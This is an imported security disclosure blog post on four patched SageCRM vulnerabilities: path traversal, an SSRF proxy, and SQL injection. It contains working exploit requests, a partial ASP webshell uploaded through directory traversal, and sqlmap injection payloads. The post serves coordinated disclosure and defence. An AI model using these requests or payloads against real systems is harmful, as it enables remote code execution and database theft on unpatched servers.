---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-09-10_directory-traversal-sql-injection-and-server-side-request-forgery.md
original_filename: 2024-09-10_directory-traversal-sql-injection-and-server-side-request-forgery.md
title: Directory Traversal, SQL Injection and Server-Side Request Forgery
category: documents
detected_topics:
- path-traversal
- ssrf
- command-injection
- supply-chain
- sqli
- otp
tags:
- imported
- documents
- path-traversal
- ssrf
- command-injection
- supply-chain
- sqli
- otp
language: en
raw_sha256: ef3dd3a54bc165dee3b33cc8f65f969f11c7e9bc652b51998bca6423d60ffb08
text_sha256: 3b203344f7248d294d3c15629b7b3bef9be0397beb1a8f7f9c94ae5cf5afeb20
ingested_at: '2026-06-28T07:32:38Z'
sensitivity: unknown
redactions_applied: true
---

# Directory Traversal, SQL Injection and Server-Side Request Forgery

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-09-10_directory-traversal-sql-injection-and-server-side-request-forgery.md
- Source Type: markdown
- Detected Topics: path-traversal, ssrf, command-injection, supply-chain, sqli, otp
- Ingested At: 2026-06-28T07:32:38Z
- Redactions Applied: True
- Raw SHA256: `ef3dd3a54bc165dee3b33cc8f65f969f11c7e9bc652b51998bca6423d60ffb08`
- Text SHA256: `3b203344f7248d294d3c15629b7b3bef9be0397beb1a8f7f9c94ae5cf5afeb20`


## Content

---
title: "Directory Traversal, SQL Injection and Server-Side Request Forgery"
page_title: "Directory Traversal, SQL Injection and Server-Side Request Forgery · Aura Research Division"
url: "https://research.aurainfosec.io/disclosure/sagecrm2/"
final_url: "https://research.aurainfosec.io/disclosure/sagecrm2/"
authors: ["Chris McCurley (@chrisrmccurley)"]
programs: ["Sage"]
bugs: ["Path traversal", "SQL injection", "SSRF"]
publication_date: "2024-09-10"
added_date: "2024-09-18"
source: "pentester.land/writeups.json"
original_index: 10
---

# Directory Traversal, SQL Injection and Server-Side Request Forgery

10 September 2024

[Chris McCurley](/authors/chris-mccurley/)

  * **CVE(s):** CVE-2023-47300, CVE-2023-47301, CVE-2023-47302,CVE-2023-47303
  * **Vendor:** Sage
  * **Product:** SageCRM
  * **Version(s) affected:** Version 2023 R2 and earlier are affected by these vulnerabilities
  * **Fixed version:** 2021 R2.5, 2022 R2.4, 2022 R2.5, 2023 R2.2, 2023 R2.3, and 2024 R1

Given the length of time since these vulnerabilities were first disclosed, I would first like to thank to the vendor for their patience during this process and transparency during the remedial phase. It has been a pleasure.

## [CVE-2023-47300](https://nvd.nist.gov/vuln/detail/CVE-2023-47300) \- Authenticated Directory Traversal through Print and Merge Preview Functionality

#

The SageCRM application allows for Document templates to be created and previewed. During the preview, the application creates a PDF on the filesystem in a user-controlled space, which is within Webroot by default. The application allows for the filename and file extension to be changed to a server-side location.

![Create and Merge](/content/disclosure/sagecrm/create-merge.png)

When the ‘Preview Merge’ functionality is submitted, the following request is observed.
  
  
  POST /crm/eware.dll/Do?SID=<session-id>&Act=562&Mode=3&CLk=&Key0=2&Key1=26201&Key2=184192&MailMergeAction=Preview HTTP/2
  Host: <host>
  Cookie: (… omitted …)
  Content-Length: 4982
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  Origin: (… omitted …)
  Content-Type: application/x-www-form-urlencoded
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Referer: https://(… omitted …)/crm/eware.dll/Do?SID=<session-id>&Act=562&Mode=3&CLk=&Key0=2&Key1=26201&Key2=184192&MailMergeAction=Preview
  Accept-Encoding: gzip, deflate
  Accept-Language: en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
  
  yearEntry=&monthEntry=&dayEntry=&_actionid=562&_HIDDEN_BEENTHERE=562&OldFileName=TemporaryTemplate.asp&IsHtml=Y&IsSubmitted=Y&FileChanged=Y&FTemplateIsPrivate=&libr_filename=asdf&_HIDDENlibr_filename=&libr_note=asdf&_HIDDENlibr_note=&GROUPSAVE=Y&NewTemplate=Y&HIDDENGTFilePath=c%3A%5Cprogram+files+%28x86%29%5Csage%5Ccrm%5Ccrm%5Cwwwroot%5CTemp%5CTemporary+Merge+Files%5C106%5C&HIDDENGTFileName=TemporaryTemplate.asp&OriginalFilePath=&Libr_UserID=106&SelectFields=&EditSource=&edit=<arbitrary-file-contents>&SaveDocName=.pdf&SaveDocNameType=.doc&SaveDocDir=S%5CSMK+PTY+LTD&HIDDENGTFileName=TemporaryTemplate.asp&HIDDENGTFilePath=c%3A%5Cprogram+files+%28x86%29%5Csage%5Ccrm%5Ccrm%5Cwwwroot%5CTemp%5CTemporary+Merge+Files%5C106%5C&GROUPUSEWHAT=SAVEGLOBALTEMPLATE&_HIDDEN_html_body=<arbitrary-file-contents>&ParentTable=&ChildTable=&Cancel_Action=545&aMergeAction=545&Original_Action=340

Remote code execution can be achieved by modifying the `edit`, `FilePath` and `FileName` parameters, such as selecting a specific folder within the webroot to drop a `.asp` webshell.

![Create and Merge webshell](/content/disclosure/sagecrm/create-merge-shell.png)

## [CVE-2023-47303](https://nvd.nist.gov/vuln/detail/CVE-2023-47303) \- Authenticated Administrative Data Upload Directory Traversal

#

The application’s administrative areas allow privileged functions like webserver and plugin modifications, configuration changes, and data uploads. However, the Data Upload feature lacked input validation, allowing arbitrary content to be uploaded to the webroot.

The snipped HTTP request below highlights the filename parameter of the data upload, containing standard directory traversal techniques to upload a webshell to the application’s webroot.
  
  
  POST /CRM/eware.dll/Do?SID=12551384132053&Act=871&Mode=61&CLk=T&Key0=4 HTTP/1.0
  Host: <host>
  Content-Length: 4885
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  Origin: http://<host>
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Referer: http://<host>/CRM/eware.dll/Do?SID=9048392392051&Act=871&Mode=60&CLk=T&Key0=4
  Accept-Encoding: gzip, deflate
  Accept-Language: en-AU,en;q=0.9
  Cookie: BID12551384132053=797DA163C0E048E5BCDB361346525F26; ASPSESSIONIDQSTASBTS=GPKBKENDDHCLIIOBOMEGIJKC
  Connection: close
  
  <..snip..>
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="DaUp_UploadFileName"; filename="../../WWWRoot/CustomPages/dataupload-rce.asp"
  Content-Type: text/html
  
  <%
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
  Function getCommandOutput(theCommand)
  Dim objShell, objCmdExec
  Set objShell = CreateObject("WScript.Shell")
  <..snip..>
  
  ------***REDACTED-SUSPECT-TOKEN***  <..snip..>

Subsequent requests to retrieve the webshell (`dataupload-rce.asp`) from within webroot is trivial.

## [CVE-2023-47301](https://nvd.nist.gov/vuln/detail/CVE-2023-47301) \- Unauthenticated Server-Side Request Forgery

#

The SageCRM application deployment exposes a `/proxy` path, related to the SDATA API, that when accessible can be used to browse internal and externally accessible services. The proxy path is accessible by the following UR:

`http(s)://<sagecrm-instance>/sdata/<instance-name>j/proxy?url=<anyURL>`

Examples include accessing the internal SystemAdmin interface which exposes authenticated users and their corresponding session tokens, or utilising the SageCRM Quick Find Service, which is a repackaged Apache SOLR instance, to achieve remote code execution. Tested instances of SageCRM came with an outdated Apache SOLR (v6.1) instance that can be abused to achieve RCE through Velocity Template Injection. It is important to note that this pre-packaged version of Apache SOLR has been updated to v8.2 in fixed versions of SageCRM.

![Sysadmin SSRF](/content/disclosure/sagecrm/sysadmin-ssrf.png)

The interesting part of this particular by-design proxy, is that it also mirrors user-supplied HTTP verbs. This allowed for HTTP POST requests to be sent to the backend Apache SOLR instance.

![RCE through SSRF](/content/disclosure/sagecrm/solr-rce.png)

## [CVE-2023-47302](https://nvd.nist.gov/vuln/detail/CVE-2023-47302) Authenticated SQL Injection within Library Search Functionality

#

In certain areas of the SageCRM application, a search function exposes user-controllable parameters that are used directly within backend SQL queries. These queries are left unsanitised, allowing for an attacker to arbitrarily request data from the underlying database.

The request below can be observed with the affected parameter `SearchSql`.
  
  
  GET /crm/eware.dll/Do?SID=15704833823331&Act=1275&Mode=1&CLk=&Key0=4&ViewField=,Libr_FileName,libr_note,libr_status,libr_category,libr_language&Multiple=Y&JumpReturnCol=GlobalLibr&JumpIdField=Libr_libraryId&JumpNameField=Libr_FileName&SearchEntity=Library&SearchTable=Library&SearchSql=Libr_Global%20%3D%20N%27Y%27%20AND%20Libr_Active%20%3D%20N%27Y%27&searchsqld=&SsDef=1&LinkedField=&TiedField=&SearchText= HTTP/2
  Host: <host>
  Cookie: <omitted>
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q= 0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Upgrade-Insecure-Requests: 1
  Te: trailers

Given the type of request being a GET request, exploitation is straightforward with sqlmap.
  
  
  Parameter: #1* (URI)
  Type: boolean-based blind
  Title: AND boolean-based blind - WHERE or HAVING clause Payload: https://<host>/crm/eware.dll/Do?SID=<sessionId>&Act=1275&Mode=1&CLk=&Ke y0=4&ViewField=,Libr_FileName,libr_note,libr_status,libr_category,libr_language&Mu ltiple=Y&JumpReturnCol=GlobalLibr&JumpIdField=Libr_libraryId&JumpNameField=Libr_Fi leName&SearchEntity=Library&SearchTable=Library&SearchSql=Libr_Global = N'Y' AND Libr_Active = N'Y' AND 8494=8494&searchsqld=&SsDef=1&LinkedField=&TiedField=&SearchText=
  
  Type: time-based blind
  Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query) Payload: https://<host>/crm/eware.dll/Do?SID=<sessionId>&Act=1275&Mode=1&CLk=&Ke y0=4&ViewField=,Libr_FileName,libr_note,libr_status,libr_category,libr_language&Mu ltiple=Y&JumpReturnCol=GlobalLibr&JumpIdField=Libr_libraryId&JumpNameField=Libr_Fi leName&SearchEntity=Library&SearchTable=Library&SearchSql=Libr_Global = N'Y' AND Libr_Active = N'Y' AND 1235=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&searchsqld=&SsDef=1&LinkedField=&TiedField=&SearchText=

## Authenticated SQL Injection within Lead Search Functionality

#

For bonus points, whilst mapping out additional functionality during the validation of remedial work, a “lead search” function was discovered that highlighted another parameter which also failed to sanitise user input.

Identification of this particular issue was fairly straightforward, with the use of single quotes.

The first single quote to break the SQL query structure:

![Lead search injection](/content/disclosure/sagecrm/one-single-quote.png)

With the second to fix the aforementioned SQL query and return with no error:

![Lead search injection](/content/disclosure/sagecrm/two-single-quotes.png)

The issue was then validated again using sqlmap.
  
  
  Parameter: #1* (URI)
  Type: stacked queries
  Title: Microsoft SQL Server/Sybase stacked queries (comment)
  Payload: https://<host>/crm/eware.dll/Do?SID=129522775915997&Act=1710&Mode=6&CLk=T&Key0=4&Key4=1&Key25=115&Key62=82&GROUPS=1&GROUPID=115&FIND=Lead';WAITFOR DELAY '0:0:1'--
  
  Type: time-based blind
  Title: Microsoft SQL Server/Sybase time-based blind (IF)
  Payload: https://<host>/crm/eware.dll/Do?SID=129522775915997&Act=1710&Mode=6&CLk=T&Key0=4&Key4=1&Key25=115&Key62=82&GROUPS=1&GROUPID=115&FIND=Lead' WAITFOR DELAY '0:0:1'-- cXHa
  
  Type: UNION query
  Title: Generic UNION query (NULL) - 1 column
  Payload: https://<host>/crm/eware.dll/Do?SID=129522775915997&Act=1710&Mode=6&CLk=T&Key0=4&Key4=1&Key25=115&Key62=82&GROUPS=1&GROUPID=115&FIND=Lead' UNION ALL SELECT CHAR(113)+CHAR(118)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(103)+CHAR(78)+CHAR(67)+CHAR(103)+CHAR(84)+CHAR(100)+CHAR(112)+CHAR(110)+CHAR(97)+CHAR(100)+CHAR(66)+CHAR(87)+CHAR(119)+CHAR(114)+CHAR(100)+CHAR(76)+CHAR(110)+CHAR(74)+CHAR(104)+CHAR(115)+CHAR(87)+CHAR(106)+CHAR(67)+CHAR(69)+CHAR(83)+CHAR(104)+CHAR(72)+CHAR(70)+CHAR(121)+CHAR(86)+CHAR(110)+CHAR(101)+CHAR(88)+CHAR(115)+CHAR(115)+CHAR(111)+CHAR(83)+CHAR(105)+CHAR(82)+CHAR(90)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(120)+CHAR(113)-- LoQP

Whilst this bug did not specifically have a CVE assigned, due to it being discovered during remedial work with the vendor, it has since been promptly resolved by the vendor.

## Disclaimer

#

The information in this article is provided for research and educational purposes only. Aura Information Security does not accept any liability in any form for any direct or indirect damages resulting from the use of or reliance on the information contained in this article.

![ Author](/img/authors/curls_hu_51a8a5322019bbcc.jpg)

Author

Chris McCurley

Principal Security Consultant

[ ](https://twitter.com/chrisrmccurley "X-Twitter")[ ](https://bugcrowd.com/dr0v3r "Bug")[](https://au.linkedin.com/in/chrismccurley "Linkedin")

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https://research.aurainfosec.io/disclosure/sagecrm2/&title=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Share on LinkedIn")[ ](https://twitter.com/intent/tweet/?url=https://research.aurainfosec.io/disclosure/sagecrm2/&text=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Tweet on Twitter")[ ](https://reddit.com/submit/?url=https://research.aurainfosec.io/disclosure/sagecrm2/&resubmit=true&title=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Submit to Reddit")[ ](https://api.whatsapp.com/send?text=https://research.aurainfosec.io/disclosure/sagecrm2/&resubmit=true&title=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Share via WhatsApp")[ ](https://t.me/share/url?url=https://research.aurainfosec.io/disclosure/sagecrm2/&resubmit=true&title=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Share via Telegram")[ ](https://pinterest.com/pin/create/bookmarklet/?url=https://research.aurainfosec.io/disclosure/sagecrm2/&description=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Pin on Pinterest")[ ](https://www.facebook.com/sharer/sharer.php?u=https://research.aurainfosec.io/disclosure/sagecrm2/&quote=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Share on Facebook")[](mailto:?body=https://research.aurainfosec.io/disclosure/sagecrm2/&subject=Directory%20Traversal,%20SQL%20Injection%20and%20Server-Side%20Request%20Forgery "Send via email")
